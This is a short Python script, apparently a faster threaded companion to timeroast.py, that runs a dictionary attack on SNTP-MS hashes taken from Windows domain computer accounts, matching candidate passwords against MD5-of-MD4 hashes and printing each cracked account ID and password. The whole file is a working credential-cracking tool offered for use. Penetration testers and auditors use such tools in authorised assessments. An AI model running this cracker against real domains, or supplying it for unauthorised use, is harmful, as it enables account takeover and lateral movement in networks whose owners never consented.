#!/usr/bin/env python3
"""
Multithreaded dictionary attack against the output of timeroast.py.
"""

import hashlib
import sys
import re
from binascii import unhexlify
from argparse import ArgumentParser, FileType, RawDescriptionHelpFormatter
from typing import TextIO, Tuple, List
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

HASH_FORMAT = r'^(?P<rid>\d+):\$sntp-ms\$(?P<hashval>[0-9a-f]{32})\$(?P<salt>[0-9a-f]{96})$'
print_lock = Lock()


def md4(data: bytes) -> bytes:
    try:
        return hashlib.new('md4', data).digest()
    except ValueError:
        from md4 import MD4
        return MD4(data).bytes()


def compute_hash(password: str, salt: bytes) -> bytes:
    return hashlib.md5(md4(password.encode('utf-16le')) + salt).digest()


def load_hashes(hashfile: TextIO) -> List[Tuple[int, bytes, bytes]]:
    hashes = []
    for line in hashfile:
        line = line.strip()
        if not line:
            continue
        m = re.match(HASH_FORMAT, line)
        if not m:
            print(f'ERROR: invalid hash format: {line}', file=sys.stderr)
            sys.exit(1)
        rid, hashval, salt = m.group('rid', 'hashval', 'salt')
        hashes.append((int(rid), unhexlify(hashval), unhexlify(salt)))
    return hashes


def crack_password(password: str, hashes: List[Tuple[int, bytes, bytes]]) -> List[Tuple[int, str]]:
    cracked = []
    password = password.strip()
    for rid, hashval, salt in hashes:
        if compute_hash(password, salt) == hashval:
            cracked.append((rid, password))
    return cracked


def main():
    parser = ArgumentParser(
        formatter_class=RawDescriptionHelpFormatter,
        description="""\
Multithreaded dictionary attack against the output of timeroast.py.
Faster and more efficient using concurrent threads.
"""
    )
    parser.add_argument('hashes', type=FileType('r'), help='Output of timeroast.py')
    parser.add_argument('dictionary', type=lambda f: open(f, encoding='latin-1'), help='Line-delimited password dictionary')
    parser.add_argument('--threads', type=int, default=10, help='Number of threads (default: 10)')

    args = parser.parse_args()
    hashes = load_hashes(args.hashes)
    passwords = [line.strip() for line in args.dictionary if line.strip()]
    crackcount = 0

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {executor.submit(crack_password, pwd, hashes): pwd for pwd in passwords}
        for future in as_completed(futures):
            results = future.result()
            for rid, password in results:
                with print_lock:
                    print(f'[+] Cracked RID {rid} password: {password}')
                crackcount += 1

    print(f'\n{crackcount} passwords recovered.\n')


if __name__ == '__main__':
    main()
